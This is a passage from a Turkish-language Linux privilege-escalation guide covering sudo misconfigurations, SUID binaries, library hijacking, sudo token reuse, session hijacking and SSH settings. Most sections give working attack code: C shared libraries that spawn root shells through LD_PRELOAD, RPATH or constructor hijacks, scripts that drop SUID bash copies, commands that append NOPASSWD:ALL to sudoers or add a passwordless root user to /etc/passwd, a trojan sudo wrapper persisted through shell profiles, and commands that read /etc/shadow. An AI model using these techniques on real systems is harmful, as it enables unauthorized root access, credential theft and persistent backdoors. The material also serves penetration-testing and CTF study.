Terraform, Go plugin handshake işlemi başarısız olsa da payload'ı root olarak çalıştırır ve arkasında bir SUID shell bırakır.

### TF_VAR overrides + symlink validation bypass

Terraform değişkenleri, sudo ortamı koruduğunda varlığını sürdüren `TF_VAR_<name>` environment variable'ları aracılığıyla sağlanabilir. `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` gibi zayıf doğrulamalar symlink'ler kullanılarak atlatılabilir:<sup>[[25]](#references)</sup>
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform sembolik bağlantıyı çözer ve gerçek `/root/root.txt` dosyasını attacker tarafından okunabilir bir hedefe kopyalar. Aynı yaklaşım, hedef sembolik bağlantıları önceden oluşturarak ayrıcalıklı yollara **yazmak** için de kullanılabilir (örneğin provider’ın hedef yolunu `/etc/cron.d/` içindeki bir konuma gösterecek şekilde).

### requiretty / !requiretty

Bazı eski dağıtımlarda sudo, sudo’nun yalnızca etkileşimli bir TTY üzerinden çalışmasını zorlayan `requiretty` ile yapılandırılabilir. `!requiretty` ayarlanmışsa (veya seçenek mevcut değilse), sudo reverse shell’ler, cron job’ları veya script’ler gibi etkileşimsiz bağlamlardan çalıştırılabilir.
```bash
Defaults !requiretty
```
Bu, kendi başına doğrudan bir güvenlik açığı değildir; ancak tam bir PTY gerektirmeden sudo kurallarının kötüye kullanılabileceği durumları genişletir.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

`sudo -l` çıktısı `env_keep+=PATH` gösteriyorsa veya saldırgan tarafından yazılabilir girdiler (ör. `/home/<user>/bin`) içeren bir `secure_path` varsa, sudo ile izin verilen hedef içindeki göreli herhangi bir komut gölgelenebilir.<sup>[[3]](#references)</sup>

- Gereksinimler: Mutlak yollar olmadan (`free`, `df`, `ps` vb.) komut çağıran bir script/binary çalıştıran bir sudo kuralı (çoğunlukla `NOPASSWD`) ve önce aranan, yazılabilir bir PATH girdisi.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo execution bypassing paths
Diğer dosyaları okumak veya **symlinks** kullanmak için **Jump**. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Bir **wildcard** kullanılıyorsa (\*), daha da kolaydır:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Karşı önlemler**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Komut yolu olmadan Sudo komutu/SUID binary'si

**sudo izni**, **yol belirtilmeden** tek bir komut için verilirse: _hacker10 ALL= (root) less_, PATH değişkenini değiştirerek bunu exploit edebilirsiniz
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Bu teknik, bir **suid** binary'si **yolu belirtmeden başka bir komutu çalıştırıyorsa da kullanılabilir (her zaman** _**strings**_ **ile garip bir SUID binary'sinin içeriğini kontrol edin)**.

[Çalıştırılacak Payload örnekleri.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Komut yolu içeren SUID binary

**suid** binary'si **yolu belirterek başka bir komutu çalıştırıyorsa**, suid dosyasının çağırdığı komutun adını taşıyan bir **function** **export** etmeyi deneyebilirsiniz.

Örneğin, bir suid binary _**/usr/sbin/service apache2 start**_ çağırıyorsa, function'ı oluşturup export etmeyi denemelisiniz:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Ardından, suid binary'yi çağırdığınızda bu function yürütülür

### SUID wrapper tarafından yürütülen yazılabilir script

Yaygın bir custom-app yanlış yapılandırması, bir script'i yürüten root-owned SUID binary wrapper'dır; script'in kendisi ise low-priv kullanıcılar tarafından yazılabilirdir.

Tipik pattern:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
`/usr/local/bin/backup.sh` yazılabilir durumdaysa, payload komutlarını ekleyebilir ve ardından SUID wrapper'ı çalıştırabilirsiniz:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Hızlı kontroller:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Bu attack path, `/usr/local/bin` içinde gönderilen "maintenance"/"backup" wrapper'larında özellikle yaygındır.

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** environment variable'ı, loader tarafından diğer tüm kütüphanelerden (standart C kütüphanesi (`libc.so`) dahil) önce yüklenmesi gereken bir veya daha fazla shared library'yi (.so dosyaları) belirtmek için kullanılır. Bu işlem, bir kütüphaneyi preload etme olarak bilinir.

Ancak sistem güvenliğini korumak ve bu özelliğin, özellikle **suid/sgid** executable'larda, exploit edilmesini önlemek için sistem belirli koşullar uygular:

- Loader, gerçek kullanıcı ID'si (_ruid_) effective kullanıcı ID'siyle (_euid_) eşleşmeyen executable'lar için **LD_PRELOAD**'u yok sayar.
- suid/sgid bulunan executable'lar için yalnızca standard path'lerde bulunan ve kendileri de suid/sgid olan kütüphaneler preload edilir.

`sudo` ile command çalıştırma yeteneğiniz varsa ve `sudo -l` çıktısı **env_keep+=LD_PRELOAD** ifadesini içeriyorsa privilege escalation gerçekleşebilir. Bu configuration, `sudo` ile command'ler çalıştırıldığında **LD_PRELOAD** environment variable'ının korunmasına ve tanınmasına izin verir; bu da elevated privileges ile arbitrary code çalıştırılmasına yol açabilir.<sup>[[9]](#references)</sup>
```
Defaults        env_keep += LD_PRELOAD
```
**/tmp/pe.c olarak kaydedin**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Ardından **bunu** şu komutu kullanarak **derleyin**:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Son olarak, **ayrıcalıkları yükseltin** çalıştırarak
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Saldırgan, library'lerin aranacağı yolu kontrol ettiği için **LD_LIBRARY_PATH** env variable'ını kontrol ediyorsa benzer bir privesc kötüye kullanılabilir.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Olağandışı görünen **SUID** izinlerine sahip bir binary ile karşılaşıldığında, **.so** dosyalarını düzgün şekilde yükleyip yüklemediğini doğrulamak iyi bir uygulamadır. Bu, aşağıdaki komut çalıştırılarak kontrol edilebilir:<sup>[[17]](#references)</sup>
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Örneğin, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ gibi bir hatayla karşılaşılması, istismar potansiyeline işaret edebilir.

Bunu istismar etmek için, _"/path/to/.config/libcalc.c"_ adında bir C dosyası oluşturulur ve dosyaya aşağıdaki kod eklenir:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Bu kod, derlenip çalıştırıldığında dosya izinlerini manipüle ederek ve yükseltilmiş ayrıcalıklara sahip bir shell çalıştırarak ayrıcalıkları yükseltmeyi amaçlar.

Yukarıdaki C dosyasını şu komutla bir shared object (.so) dosyasına derleyin:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Son olarak, etkilenen SUID binary'sini çalıştırmak exploit'i tetiklemeli ve potansiyel olarak sistemin ele geçirilmesine olanak tanımalıdır.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Şimdi, yazma yetkimiz olan bir klasörden library yükleyen bir SUID binary bulduğumuza göre, gerekli adla library'yi bu klasörde oluşturalım:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Şuna benzer bir hata alırsanız
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
bu, oluşturduğunuz library'nin `a_function_name` adlı bir function'a sahip olması gerektiği anlamına gelir.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io), bir attacker tarafından yerel security restrictions'ı bypass etmek için exploit edilebilen Unix binary'lerinin derlenmiş bir listesidir. [**GTFOArgs**](https://gtfoargs.github.io/) ise bir command'e **yalnızca argument inject edebildiğiniz** durumlar için aynı işlevi görür.

Project, restricted shell'lerden çıkmak, elevated privileges'ı escalate etmek veya korumak, file transfer etmek, bind ve reverse shell başlatmak ve diğer post-exploitation görevlerini kolaylaştırmak için abuse edilebilen Unix binary'lerinin legitimate functions'larını toplar.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l`'ye erişebiliyorsanız, herhangi bir sudo rule'unu nasıl exploit edeceğini bulup bulamadığını kontrol etmek için [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) tool'unu kullanabilirsiniz.

### Sudo Token'larını Yeniden Kullanma

**sudo access** sahibi olduğunuz ancak password'e sahip olmadığınız durumlarda, **bir sudo command execution gerçekleşmesini bekleyip ardından session token'ını hijack ederek** privileges'ı escalate edebilirsiniz.<sup>[[18]](#references)</sup>

Privileges'ı escalate etmek için gerekenler:

- "_sampleuser_" kullanıcısı olarak zaten bir shell'iniz var
- "_sampleuser_" **son 15 dakika içinde `sudo` kullandı** (varsayılan olarak bu, herhangi bir password girmeden `sudo` kullanmamıza izin veren sudo token'ın geçerlilik süresidir)
- `cat /proc/sys/kernel/yama/ptrace_scope` 0 değerini döndürüyor
- `gdb` erişilebilir durumda (upload edebilmeniz gerekir)

(`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ile `ptrace_scope`'u geçici olarak etkinleştirebilir veya `/etc/sysctl.d/10-ptrace.conf` dosyasını kalıcı olarak değiştirip `kernel.yama.ptrace_scope = 0` ayarını yapabilirsiniz)

Tüm bu gereksinimler karşılanıyorsa, **şunu kullanarak privileges'ı escalate edebilirsiniz:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **İlk exploit** (`exploit.sh`), _/tmp_ içinde `activate_sudo_token` binary'sini oluşturur. Bunu **session'ınızdaki sudo token'ı activate etmek** için kullanabilirsiniz (otomatik olarak bir root shell almazsınız, `sudo su` çalıştırın):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **İkinci exploit** (`exploit_v2.sh`), _/tmp_ içinde **root tarafından sahip olunan ve setuid bit'i ayarlanmış** bir sh shell oluşturur.
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **third exploit** (`exploit_v3.sh`) **sudoers file** oluşturur; bu dosya **sudo tokens**'ı kalıcı hale getirir ve tüm kullanıcıların **sudo** kullanmasına izin verir.
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Klasörde veya klasör içindeki oluşturulmuş dosyalardan herhangi birinde **yazma izinleriniz** varsa, bir kullanıcı ve PID için **sudo token oluşturmak** amacıyla [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) binary'sini kullanabilirsiniz.\
Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasının üzerine yazabiliyor ve PID'si 1234 olan bu kullanıcı adına bir shell'iniz varsa, aşağıdakini yaparak parolayı bilmenize gerek kalmadan **sudo ayrıcalıkları elde edebilirsiniz**:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

`/etc/sudoers` dosyası ve `/etc/sudoers.d` içindeki dosyalar, `sudo` kullanabilecek kişileri ve kullanım şeklini yapılandırır. Bu dosyalar **varsayılan olarak yalnızca root kullanıcısı ve root grubu tarafından okunabilir**.\
**Eğer** bu dosyayı **okuyabilirseniz**, **bazı ilginç bilgiler elde edebilirsiniz** ve herhangi bir dosyaya **yazabilirseniz**, **yetki yükseltebilirsiniz**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Yazabiliyorsanız bu izni kötüye kullanabilirsiniz.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Bu izinleri kötüye kullanmanın başka bir yolu:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD için `doas` gibi `sudo` binary'sine alternatifler vardır; yapılandırmasını `/etc/doas.conf` dosyasında kontrol etmeyi unutmayın.
```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```
`doas` bir editor veya interpreter çalıştırmaya izin veriyorsa, GTFOBins tarzı kaçış yöntemlerini kontrol edin:
```bash
doas vim
:!/bin/sh
```
### Sudo Hijacking

Bir **kullanıcının genellikle bir makineye bağlandığını ve yetkilerini yükseltmek için `sudo` kullandığını** biliyorsanız ve bu kullanıcı bağlamında bir shell elde ettiyseniz, **kodunuzu root olarak ve ardından kullanıcının komutunu çalıştıracak yeni bir sudo executable'ı** oluşturabilirsiniz. Ardından, kullanıcı `sudo` çalıştırdığında sizin sudo executable'ınızın çalıştırılması için kullanıcının bağlamındaki **$PATH'i değiştirin** (örneğin `.bash_profile` dosyasına yeni yolu ekleyerek).

Kullanıcının farklı bir shell (bash olmayan) kullandığını unutmayın; yeni yolu eklemek için başka dosyaları değiştirmeniz gerekir. Örneğin [sudo-piggyback](https://github.com/APTy/sudo-piggyback), `~/.bashrc`, `~/.zshrc` ve `~/.bash_profile` dosyalarını değiştirir. Başka bir örneği [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) içinde bulabilirsiniz.

Ya da aşağıdakine benzer bir şey çalıştırarak:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

`/etc/ld.so.conf` dosyası, **yüklenen yapılandırma dosyalarının nereden alındığını** belirtir. Genellikle bu dosya aşağıdaki yolu içerir: `include /etc/ld.so.conf.d/*.conf`

Bu, `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyalarının okunacağı anlamına gelir. Bu yapılandırma dosyaları, **kütüphanelerin** **aranacağı** diğer klasörleri **belirtir**. Örneğin, `/etc/ld.so.conf.d/libc.conf` dosyasının içeriği `/usr/local/lib` şeklindedir. **Bu, sistemin kütüphaneleri `/usr/local/lib` içinde arayacağı anlamına gelir**.

Herhangi bir nedenle **bir kullanıcının** şu yollardan herhangi biri üzerinde **yazma izinleri** varsa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` içindeki herhangi bir dosya veya `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyasında belirtilen herhangi bir klasör, ayrıcalıkları yükseltebilir.\
Aşağıdaki sayfada **bu yanlış yapılandırmanın nasıl exploit edileceğine** göz atın:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib `/var/tmp/flag15/` içine kopyalandığında, `RPATH` değişkeninde belirtildiği üzere program tarafından bu konumda kullanılacaktır.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Ardından `/var/tmp` içinde `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` ile kötü amaçlı bir library oluşturun.
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Yetenekler

Linux capabilities, **mevcut root ayrıcalıklarının bir alt kümesini bir prosese sağlar**. Bu, root **ayrıcalıklarını daha küçük ve farklı birimlere böler**. Bu birimlerin her biri daha sonra proseslere bağımsız olarak verilebilir. Bu şekilde tüm ayrıcalık kümesi azaltılarak exploitation riskleri düşürülür.\
**Capabilities ve bunların nasıl abuse edilebileceği hakkında daha fazla bilgi edinmek** için aşağıdaki sayfayı okuyun:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Dizin izinleri

Bir dizinde **"execute" biti**, etkilenen kullanıcının klasöre "**cd**" ile girebileceği anlamına gelir.\
**"read" biti**, kullanıcının **dosyaları** **listeleyebileceği**, **"write" biti** ise yeni **dosyaları** **silebileceği** ve **oluşturabileceği** anlamına gelir.

## ACLs

Access Control Lists (ACLs), isteğe bağlı izinlerin ikincil katmanını temsil eder ve **geleneksel ugo/rwx izinlerini geçersiz kılabilir**. Bu izinler, sahip olmayan veya grubun parçası olmayan belirli kullanıcılar için haklara izin vererek ya da bu hakları reddederek dosya veya dizin erişimi üzerindeki kontrolü artırır. Bu düzeydeki **ayrıntılı kontrol, daha hassas erişim yönetimi sağlar**. Daha fazla ayrıntıya [**buradan**](https://linuxconfig.org/how-to-manage-acls-on-linux) ulaşabilirsiniz.<sup>[[19]](#references)</sup>

Bir dosya üzerinde "kali" kullanıcısına **read** ve **write** izinleri **verin**:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
Sistemden belirli ACL'lere sahip dosyaları **Get** edin:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### sudoers drop-in'lerinde gizli ACL backdoor'u

Yaygın bir yanlış yapılandırma, `/etc/sudoers.d/` içinde `440` moduna sahip root sahipli bir dosyanın ACL aracılığıyla düşük ayrıcalıklı bir kullanıcıya hâlâ yazma erişimi vermesidir.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
`user:alice:rw-` gibi bir şey görürseniz, kullanıcı kısıtlayıcı mod bitlerine rağmen bir sudo kuralı ekleyebilir:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Bu, `ls -l` ile yapılan incelemelerde kolayca gözden kaçabildiği için yüksek etkili bir ACL persistence/privesc yoludur.

## Open shell sessions

**old versions** içinde farklı bir kullanıcının (**root**) bazı **shell** session'larını **hijack** edebilirsiniz.\
**newest versions** içinde ise screen session'larına yalnızca **kendi kullanıcınızla** **connect** olabilirsiniz. Ancak **session** içinde **interesting information** bulabilirsiniz.

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![screen sessions hijacking - Socket locations (some systems expose one as symlink of the other): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Bir oturuma bağlan**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Bu, **eski tmux sürümleri** ile ilgili bir problemdi. Ayrıcalıksız bir kullanıcı olarak root tarafından oluşturulan bir tmux (v2.1) oturumunu hijack edemedim.

**tmux oturumlarını listeleme**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![Socket konumları (bazı sistemler birini diğerinin symlink'i olarak sunar) - tmux sessions hijacking: tmux -S /tmp/dev sess ls Bu socket'i kullanarak listeleyin; bu socket üzerinde bir tmux session başlatabilirsiniz...](<../../images/image (837).png>)

**Bir session'a bağlanın**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Örnek olarak **HTB'deki Valentine box**'ı inceleyin.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Eylül 2006 ile 13 Mayıs 2008 arasında Debian tabanlı sistemlerde (Ubuntu, Kubuntu vb.) oluşturulan tüm SSL ve SSH anahtarları bu bug'dan etkilenmiş olabilir.\
Bu bug, bu işletim sistemlerinde yeni bir ssh key oluşturulurken meydana gelir; çünkü **yalnızca 32.768 varyasyon mümkündü**. Bu, tüm olasılıkların hesaplanabileceği ve **ssh public key'e sahip olarak karşılık gelen private key'in aranabileceği** anlamına gelir. Hesaplanan olasılıkları burada bulabilirsiniz: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Password authentication'a izin verilip verilmediğini belirtir. Varsayılan değer `no`'dur.
- **PubkeyAuthentication:** Public key authentication'a izin verilip verilmediğini belirtir. Varsayılan değer `yes`'dir.
- **PermitEmptyPasswords**: Password authentication etkin olduğunda, server'ın boş password string'lerine sahip hesaplara login yapılmasına izin verip vermediğini belirtir. Varsayılan değer `no`'dur.

### Login control files

Bu dosyalar kimin login yapabileceğini ve bunun nasıl gerçekleşeceğini etkiler:

- **`/etc/nologin`**: mevcutsa, root olmayan login'leri engeller ve mesajını görüntüler.
- **`/etc/securetty`**: root'un nereden login yapabileceğini kısıtlar (TTY allowlist).
- **`/etc/motd`**: login sonrası banner'dır (environment veya bakım ayrıntılarını leak edebilir).

### PermitRootLogin

root'un ssh kullanarak login yapıp yapamayacağını belirtir; varsayılan değer `no`'dur. Olası değerler:

- `yes`: root, password ve private key kullanarak login olabilir
- `without-password` veya `prohibit-password`: root yalnızca private key ile login olabilir
- `forced-commands-only`: Root yalnızca private key kullanarak ve commands options belirtildiğinde login olabilir
- `no` : no

### AuthorizedKeysFile

User authentication için kullanılabilecek public key'leri içeren dosyaları belirtir. Home directory ile değiştirilecek `%h` gibi token'lar içerebilir. **Absolute paths** (`/` ile başlayan) veya **user'ın home directory'sinden relative paths** belirtebilirsiniz. Örneğin:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Bu yapılandırma, "**testusername**" kullanıcısının **private** anahtarıyla giriş yapmayı denediğinizde SSH'nin anahtarınızın public anahtarını `/home/testusername/.ssh/authorized_keys` ve `/home/testusername/access` konumlarında bulunanlarla karşılaştıracağını belirtir.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding, anahtarları (passphrase olmadan!) server üzerinde bırakmak yerine **local SSH keys** kullanmanızı sağlar. Böylece SSH ile bir **host**'a **jump** edebilir ve oradan, **initial host**'unuzda bulunan **key**'i **kullanarak** başka bir **host**'a **jump** edebilirsiniz.

Bu seçeneği `$HOME/.ssh.config` içinde aşağıdaki gibi ayarlamanız gerekir:
```
Host example.com
ForwardAgent yes
```
`Host` değeri `*` ise kullanıcı her farklı makineye geçtiğinde, o host anahtarlara erişebilir (bu bir güvenlik sorunudur).

`/etc/ssh_config` dosyası bu **options** değerini **override** edebilir ve bu yapılandırmaya izin verebilir veya erişimi reddedebilir.\
`/etc/sshd_config` dosyası, `AllowAgentForwarding` anahtar sözcüğüyle ssh-agent forwarding işlemine izin verebilir veya erişimi reddedebilir (varsayılan değer allow'dur).

Forward Agent'ın bir ortamda yapılandırıldığını fark ederseniz, **privileges escalate** etmek için bunu abuse edebileceğinizden aşağıdaki sayfayı okuyun:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## İlginç Dosyalar

### Profile dosyaları

`/etc/profile` dosyası ve `/etc/profile.d/` altındaki dosyalar, **bir kullanıcı yeni bir shell çalıştırdığında yürütülen scriptlerdir**. Bu nedenle, bunlardan herhangi birine **yazabilir veya değiştirebilirseniz privileges escalate edebilirsiniz**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Herhangi bir şüpheli profil script'i bulunursa **hassas ayrıntılar** içerip içermediğini kontrol etmelisiniz.

### Passwd/Shadow Dosyaları

İşletim sistemine bağlı olarak `/etc/passwd` ve `/etc/shadow` dosyaları farklı bir ad kullanıyor olabilir veya bir yedekleri bulunabilir. Bu nedenle **hepsini bulmanız** ve dosyaların içinde **hash'ler olup olmadığını** görmek için **okuyup okuyamadığınızı kontrol etmeniz** önerilir:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Bazı durumlarda **password hashes**, `/etc/passwd` (veya eşdeğeri) dosyasında bulunabilir.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Yazılabilir /etc/passwd

İlk olarak, aşağıdaki komutlardan biriyle bir parola oluşturun.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Ardından `hacker` kullanıcısını ekleyin ve oluşturulan parolayı ekleyin.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Örn.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `hacker:hacker` ile `su` komutunu kullanabilirsiniz.

Alternatif olarak, parolası olmayan sahte bir kullanıcı eklemek için aşağıdaki satırları kullanabilirsiniz.\
UYARI: makinenin mevcut güvenliğini zayıflatabilirsiniz.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOT: BSD platformlarında `/etc/passwd`, `/etc/pwd.db` ve `/etc/master.passwd` konumlarında bulunur; ayrıca `/etc/shadow`, `/etc/spwd.db` olarak yeniden adlandırılmıştır.

**Hassas dosyalara yazıp yazamadığınızı** kontrol etmelisiniz. Örneğin, herhangi bir **servis yapılandırma dosyasına** yazabiliyor musunuz?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Örneğin, makine bir **tomcat** sunucusu çalıştırıyorsa ve **/etc/systemd/ içindeki Tomcat servis yapılandırma dosyasını değiştirebiliyorsanız,** şu satırları değiştirebilirsiniz:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor'unuz, tomcat bir sonraki başlatıldığında çalıştırılacaktır.

### Klasörleri Kontrol Et

Aşağıdaki klasörler yedekler veya ilginç bilgiler içerebilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Muhtemelen sonuncusunu okuyamayacaksınız, ancak deneyin)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
